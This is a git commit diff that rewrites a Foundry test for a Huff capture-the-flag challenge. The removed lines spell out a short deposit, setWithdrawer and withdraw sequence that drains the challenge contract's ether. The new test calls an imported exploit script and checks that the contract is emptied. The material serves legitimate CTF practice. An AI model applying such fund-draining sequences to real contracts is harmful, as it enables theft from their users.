e650cb007dd6e0dfa019a9a234267861d03b5862
minaminao <minaminaoy@gmail.com>
2022-08-23 05:24:51 +0900

    Fix exploit

--- src/HuffChallenge/challenge3/Challenge3.t.sol
+++ src/HuffChallenge/challenge3/Challenge3.t.sol
@@ -5,37 +5,25 @@ import "foundry-huff/HuffDeployer.sol";
 import "forge-std/Test.sol";
 import "./IChallenge3.sol";
 import "./Challenge3Exploit.sol";
-import "forge-std/console2.sol";
 
 contract Challenge3Test is Test {
     address playerAddress = address(10);
     Challenge3 test;
 
     function setUp() public {
-        test = Challenge3(
-            HuffDeployer.deploy("HuffChallenge/challenge3/Challenge3")
-        );
+        test = Challenge3(HuffDeployer.deploy("HuffChallenge/challenge3/Challenge3"));
         test.deposit{value: 0.1 ether}();
         assertEq(address(test).balance, 0.1 ether);
     }
 
     function testExploit() public {
-        vm.startPrank(address(1));
-        vm.deal(address(1), 1 ether);
-        test.deposit{value: 1}();
-        test.setWithdrawer{value: 2}(address(1));
-        assertEq(address(test).balance, 100_000_000_000_000_003);
-        test.withdraw();
-        vm.stopPrank();
-        assertEq(address(test).balance, 0 ether);
-        assertEq(address(1).balance, 1.1 ether);
-    }
+        vm.deal(playerAddress, 1 ether);
 
-    // WIP
-    // function testExploitScript() public {
-    //     vm.deal(playerAddress, 1 ether);
-    //     vm.startPrank(playerAddress, playerAddress);
-    //     playerScript(address(test), address(playerAddress));
-    //     vm.stopPrank();
-    // }
+        vm.startPrank(playerAddress, playerAddress);
+        playerScript(address(test));
+        vm.stopPrank();
+
+        assertEq(address(test).balance, 0 ether);
+        assertEq(playerAddress.balance, 1.1 ether);
+    }
 }
